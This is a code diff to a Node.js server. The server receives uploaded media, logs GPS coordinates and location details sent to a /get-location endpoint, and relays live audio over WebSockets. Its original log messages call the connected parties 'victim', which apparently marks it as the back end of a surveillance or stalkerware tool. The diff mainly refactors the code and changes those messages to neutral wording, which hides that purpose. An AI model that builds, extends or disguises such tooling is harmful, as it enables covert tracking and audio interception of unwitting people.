@@ -5,12 +5,17 @@ const fs = require("fs");
 const morgan = require("morgan");
 const WebSocket = require("ws");
 const app = express();
-const httpPort = Number(process.argv[2]);
-const wsVideoPort = Number(process.argv[3]);
-const wsAudioPort = Number(process.argv[4]);
-if ([httpPort, wsVideoPort, wsAudioPort].some(p => isNaN(p))) {
-  throw new Error("All ports must be numbers");
+const args = process.argv.slice(2);
+if (args.length < 3) {
+  throw new Error("Usage: node server.js <httpPort> <wsVideoPort> <wsAudioPort>");
 }
+const [httpPort, wsVideoPort, wsAudioPort] = args.map(p => {
+  const num = Number(p);
+  if (!Number.isInteger(num)) {
+    throw new Error(`Invalid port value: ${p}`);
+  }
+  return num;
+});
 const PORT = httpPort;
 const UPLOAD_IMAGES = path.join(__dirname, "uploads");
 const UPLOAD_AUDIOS = path.join(__dirname, "audios");
@@ -50,7 +55,7 @@ const storage = multer.diskStorage({
   }
 });
 const upload = multer({
-  storage: storage,
+  storage,
   limits: { fileSize: 50 * 1024 * 1024 }
 });
 app.post("/upload", upload.array("files"), (req, res) => {
@@ -65,12 +70,11 @@ app.post("/upload", upload.array("files"), (req, res) => {
     files: req.files.map(file => ({
       filename: file.filename,
       type: file.mimetype,
-      path:
-        file.mimetype.startsWith("image/")
-          ? `/uploads/${file.filename}`
-          : file.mimetype.startsWith("audio/")
-          ? `/audios/${file.filename}`
-          : `/videos/${file.filename}`
+      path: file.mimetype.startsWith("image/")
+        ? `/uploads/${file.filename}`
+        : file.mimetype.startsWith("audio/")
+        ? `/audios/${file.filename}`
+        : `/videos/${file.filename}`
     }))
   });
 });
@@ -84,14 +88,14 @@ app.post("/get-location", (req, res) => {
       });
     }
     const timestamp = new Date().toISOString();
-    const logEntry = `[${timestamp}]
-Source: ${location.source || "unknown"}
-Latitude: ${location.lat}
-Longitude: ${location.lng}
-City: ${location.city || "N/A"}
-Country: ${location.country || "N/A"}
------------------------------------
-`;
+    const logEntry =
+      `[${timestamp}] ` +
+      `Source: ${location.source || "unknown"} ` +
+      `Latitude: ${location.lat} ` +
+      `Longitude: ${location.lng} ` +
+      `City: ${location.city || "N/A"} ` +
+      `Country: ${location.country || "N/A"}\n` +
+      `-----------------------------------\n`;
     fs.appendFileSync(LOG_FILE, logEntry);
     res.status(200).json({
       success: true,
@@ -141,16 +145,20 @@ let browserAudio = null;
 wssAudio.on("connection", ws => {
   console.log("Audio WebSocket connected");
   ws.on("message", data => {
-    if (ws === audioClient && browserAudio && browserAudio.readyState === WebSocket.OPEN) {
+    if (
+      ws === audioClient &&
+      browserAudio &&
+      browserAudio.readyState === WebSocket.OPEN
+    ) {
       browserAudio.send(data);
     }
   });
   if (!audioClient) {
     audioClient = ws;
-    console.log("🎤 Victim connected for audio");
+    console.log("🎤 First audio client connected");
   } else if (!browserAudio) {
     browserAudio = ws;
-    console.log("🌐 Browser victim connected to audio");
+    console.log("🌐 Browser audio client connected");
   } else {
     ws.close();
   }
